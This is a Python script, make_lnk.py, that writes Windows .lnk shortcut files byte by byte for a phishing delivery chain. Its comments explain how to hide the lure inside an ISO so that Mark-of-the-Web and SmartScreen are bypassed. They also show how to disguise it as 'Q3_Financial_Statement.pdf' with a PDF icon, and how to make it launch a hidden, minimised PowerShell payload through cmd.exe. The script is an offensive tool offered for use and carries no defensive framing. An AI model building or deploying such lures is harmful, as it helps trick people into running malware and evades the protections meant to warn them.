#!/usr/bin/env python3
# make_lnk.py - build a Windows Shell Link (.lnk) from scratch (no Windows needed).
#
# Why this exists
# ---------------
# A .lnk dropped *inside* an ISO/VHD inherits no Mark-of-the-Web (NTFS
# Zone.Identifier), so Explorer opens it without the SmartScreen / first-run
# reputation prompt that a downloaded .exe/.scr triggers. Combined with:
#   * a document-looking file name where the real extension is hidden
#     (e.g. "Q3_Financial_Statement.pdf.lnk" with the .lnk hidden by Explorer),
#   * a decoy icon (a PDF icon from imageres.dll),
# the LNK looks like a document and, on double-click, launches the real payload
# that sits next to it inside the mounted ISO.
#
# This writer speaks the MS-SHLLINK binary format directly, so the whole chain
# (LNK + ISO) is produced on the attacker box (Kali) with no Windows tooling.
#
# Format notes
# ------------
# ShellLinkHeader (0x4C bytes) -> [LinkTargetIDList] -> [LinkInfo] ->
# [StringData] -> [ExtraData].
#
# Explorer/ShellExecute resolve a link from its LinkTargetIDList (a shell PIDL)
# first and only then from LinkInfo; a link without an IDList does not launch.
# So we embed the built-in IDList for C:\Windows\System32\cmd.exe (a stable
# path on every Windows install) and point the arguments at our payload. That
# keeps the link resolvable on any target while the command line handles the
# payload location (which is unknown because the mounted ISO gets a random
# drive letter).
#
# Validated on Windows 10 22H2: WScript.Shell reads back the exact
# TargetPath/Arguments/IconLocation, and Start-Process on the generated .lnk
# launches cmd.exe and runs the arguments.
#
# Usage (on Kali, after the repo is copied over):
#   python3 scripts/make_lnk.py \
#       --target  'C:\Windows\System32\cmd.exe' \
#       --args    '/c powershell -w hidden -nop -c "..."' \
#       --workdir 'C:\Windows\System32' \
#       --name    'Q3_Financial_Statement.pdf' \
#       --icon    '%SystemRoot%\System32\imageres.dll,-102' \
#       --show    7 \
#       --output  'dist/Q3_Financial_Statement.pdf.lnk'
#
import argparse
import base64
import os
import struct
import sys

# ---------------------------------------------------------------------------
# Constants (MS-SHLLINK)
# ---------------------------------------------------------------------------
CLSID_SHELL_LINK = bytes([
    0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
])

HEADER_SIZE = 0x4C  # 76 bytes

# LinkFlags
HAS_TARGET_IDLIST = 0x00000001
HAS_LINK_INFO     = 0x00000002
HAS_NAME          = 0x00000004
HAS_RELATIVE_PATH = 0x00000008
HAS_WORKING_DIR   = 0x00000010
HAS_ARGUMENTS     = 0x00000020
HAS_ICON_LOCATION = 0x00000040
IS_UNICODE        = 0x00000080

DRIVE_UNKNOWN     = 0
DRIVE_NO_ROOT_DIR = 1
DRIVE_REMOVABLE   = 2
DRIVE_FIXED       = 3
DRIVE_REMOTE      = 4
DRIVE_CDROM       = 5
DRIVE_RAMDISK     = 6

SHOWNORMAL = 1

# ---------------------------------------------------------------------------
# Built-in LinkTargetIDList for C:\Windows\System32\cmd.exe.
#
# A .lnk whose target is resolved by Explorer needs a shell item ID list
# (LinkTargetIDList); LinkInfo alone is not enough for ShellExecute/Explorer to
# find the target. cmd.exe lives at the same absolute path on every Windows
# install, so its shell IDList is stable and can be embedded here. Extracted
# from a Windows-generated shortcut; the shell matches the item by name, so the
# per-volume file reference baked into the list is only a fast-path hint.
# ---------------------------------------------------------------------------
CMD_EXE = r"C:\Windows\System32\cmd.exe"
IDLIST_CMD_EXE = base64.b64decode(
    "FAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAVgAxAAAAAABCXQRh"
    "EABXaW5kb3dzAEAACQAEAO++h093SEJdKqMuAAAAJQYAAAAAAQAAAAAAAAAAAAAAAAAAAPKY4ABX"
    "AGkAbgBkAG8AdwBzAAAAFgBaADEAAAAAAEJd9V0QAFN5c3RlbTMyAABCAAkABADvvodPd0hCXVSj"
    "LgAAAN8MAAAAAAEAAAAAAAAAAAAAAAAAAADgGggAUwB5AHMAdABlAG0AMwAyAAAAGABWADIAAGwE"
    "AHRZzaIgAGNtZC5leGUAQAAJAAQA7750Wc2iQl2loi4AAAC4pAQAAAABAAAAAAAAAQAAAAAAAAAAr9G5"
    "AGMAbQBkAC4AZQB4AGUAAAAWAAAA"
)


def _ascii(s):
    """Encode a Windows path/string as a single-byte (CP1252) byte string."""
    return s.encode("cp1252", errors="replace")


def _resolve_idlist(a):
    """Pick the LinkTargetIDList to embed.

    Priority: explicit --idlist (base64 string, or a path to a file holding the
    raw bytes) > the built-in cmd.exe list when the target is cmd.exe > none.
    """
    if a.idlist:
        try:
            if os.path.isfile(a.idlist):
                with open(a.idlist, "rb") as fh:
                    return fh.read()
        except (OSError, ValueError):
            pass
        try:
            return base64.b64decode(a.idlist)
        except Exception:
            raise SystemExit("[-] --idlist must be base64 or a file with raw IDList bytes")

    if a.target and a.target.strip().lower() == CMD_EXE.lower():
        return IDLIST_CMD_EXE
    return None


def build_volume_id(drive_type=DRIVE_FIXED, serial=0, label=""):
    """VolumeID structure referenced from LinkInfo."""
    label_bytes = _ascii(label) + b"\x00"
    # VolumeIDSize(4) DriveType(4) DriveSerialNumber(4) VolumeLabelOffset(4) + label
    size = 16 + len(label_bytes)
    return (
        struct.pack("<I", size)
        + struct.pack("<I", drive_type)
        + struct.pack("<I", serial)
        + struct.pack("<I", 0x10)          # VolumeLabelOffset -> right after header
        + label_bytes
    )


def build_link_info(local_base_path, drive_type=DRIVE_FIXED, serial=0, volume_label=""):
    """LinkInfo structure with VolumeIDAndLocalBasePath."""
    vid = build_volume_id(drive_type, serial, volume_label)
    lbp = _ascii(local_base_path) + b"\x00"
    cps = b"\x00"                          # CommonPathSuffix = "" (empty)

    header_size = 0x1C                     # 7 * 4-byte fields
    vol_off = header_size
    lbp_off = vol_off + len(vid)
    cps_off = lbp_off + len(lbp)
    size = cps_off + len(cps)

    header = struct.pack(
        "<IIIIIII",
        size,          # LinkInfoSize
        header_size,   # LinkInfoHeaderSize
        0x00000001,    # LinkInfoFlags: VolumeIDAndLocalBasePath
        vol_off,       # VolumeIDOffset
        lbp_off,       # LocalBasePathOffset
        0,             # CommonNetworkRelativeLinkOffset (unused)
        cps_off,       # CommonPathSuffixOffset
    )
    return header + vid + lbp + cps


def build_string_data(s):
    """Unicode StringData entry: Count (chars incl. NUL) + UTF-16LE + NUL."""
    if not s:
        return b""
    encoded = s.encode("utf-16-le") + b"\x00\x00"
    return struct.pack("<H", len(s) + 1) + encoded


def build_header(flags, file_attributes=0, icon_index=0,
                 show_command=SHOWNORMAL, file_size=0):
    return b"".join([
        struct.pack("<I", HEADER_SIZE),
        CLSID_SHELL_LINK,
        struct.pack("<I", flags),
        struct.pack("<I", file_attributes),
        struct.pack("<Q", 0),               # CreationTime
        struct.pack("<Q", 0),               # AccessTime
        struct.pack("<Q", 0),               # WriteTime
        struct.pack("<I", file_size),       # FileSize (low 32 bits)
        struct.pack("<i", icon_index),      # IconIndex
        struct.pack("<I", show_command),    # ShowCommand
        struct.pack("<H", 0),               # HotKey
        struct.pack("<H", 0),               # Reserved (MUST be zero)
        struct.pack("<I", 0),               # Reserved2 (MUST be zero)
        struct.pack("<I", 0),               # Reserved3 (MUST be zero)
    ])


def build_lnk(target=None, args=None, workdir=None, relative=None,
              name=None, icon=None, icon_index=0, drive_type=DRIVE_FIXED,
              serial=0, volume_label="", show_command=SHOWNORMAL,
              terminal_block=True, target_idlist=None):
    """Assemble a complete .lnk byte string."""
    flags = IS_UNICODE

    # LinkTargetIDList must be the first section, before LinkInfo.
    idlist = b""
    if target_idlist:
        flags |= HAS_TARGET_IDLIST
        idlist = struct.pack("<H", len(target_idlist)) + target_idlist

    link_info = b""
    if target:
        flags |= HAS_LINK_INFO
        link_info = build_link_info(target, drive_type, serial, volume_label)

    # StringData must be emitted in this fixed order.
    strdata = b""
    if name:
        flags |= HAS_NAME
        strdata += build_string_data(name)
    if relative:
        flags |= HAS_RELATIVE_PATH
        strdata += build_string_data(relative)
    if workdir:
        flags |= HAS_WORKING_DIR
        strdata += build_string_data(workdir)
    if args:
        flags |= HAS_ARGUMENTS
        strdata += build_string_data(args)
    if icon:
        flags |= HAS_ICON_LOCATION
        strdata += build_string_data(icon)

    header = build_header(flags, icon_index=icon_index, show_command=show_command)
    extra = b"\x00\x00\x00\x00" if terminal_block else b""
    return header + idlist + link_info + strdata + extra


def main(argv=None):
    p = argparse.ArgumentParser(
        description="Build a Windows .lnk (Shell Link) from scratch.")
    p.add_argument("--target", default=None,
                   help=r"absolute target path, e.g. C:\Windows\System32\cmd.exe")
    p.add_argument("--args", default=None,
                   help="command-line arguments passed to the target")
    p.add_argument("--workdir", default=None,
                   help="working directory stored in the link")
    p.add_argument("--relative", default=None,
                   help="path to the target relative to the .lnk location")
    p.add_argument("--name", default=None,
                   help="display name (shown in Explorer tooltips/properties)")
    p.add_argument("--icon", default=None,
                   help=r"icon location, e.g. %%SystemRoot%%\System32\imageres.dll,-102")
    p.add_argument("--icon-index", type=int, default=0,
                   help="icon index inside the icon file (default 0)")
    p.add_argument("--drive-type", type=int, default=DRIVE_FIXED,
                   help="VolumeID drive type (default 3 = fixed)")
    p.add_argument("--serial", type=int, default=0,
                   help="VolumeID drive serial number (default 0)")
    p.add_argument("--volume-label", default="", help="VolumeID label")
    p.add_argument("--show", type=int, default=SHOWNORMAL,
                   help="ShowCommand (1=normal, 3=max, 7=min)")
    p.add_argument("--no-terminal-block", action="store_true",
                   help="omit the terminal ExtraData block")
    p.add_argument("--idlist", default=None,
                   help="LinkTargetIDList as base64, or a file containing the "
                        "raw IDList bytes (default: built-in cmd.exe list)")
    p.add_argument("--output", "-o", required=True, help="output .lnk path")
    a = p.parse_args(argv)

    if not a.target and not a.relative:
        p.error("provide at least --target or --relative")

    data = build_lnk(
        target=a.target, args=a.args, workdir=a.workdir, relative=a.relative,
        name=a.name, icon=a.icon, icon_index=a.icon_index,
        drive_type=a.drive_type, serial=a.serial, volume_label=a.volume_label,
        show_command=a.show, terminal_block=not a.no_terminal_block,
        target_idlist=_resolve_idlist(a),
    )

    with open(a.output, "wb") as fh:
        fh.write(data)

    # A .lnk is small by nature; sanity-check the size and header.
    if len(data) < HEADER_SIZE:
        print("[-] internal error: link shorter than header", file=sys.stderr)
        return 1

    print("[+] wrote %s (%d bytes)" % (a.output, len(data)))
    print("    target   : %s" % (a.target or "(relative only)"))
    print("    idlist   : %s" % ("yes" if _resolve_idlist(a) else "no"))
    if a.relative:
        print("    relative : %s" % a.relative)
    if a.args:
        print("    args     : %s" % a.args)
    if a.icon:
        print("    icon     : %s,%d" % (a.icon, a.icon_index))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
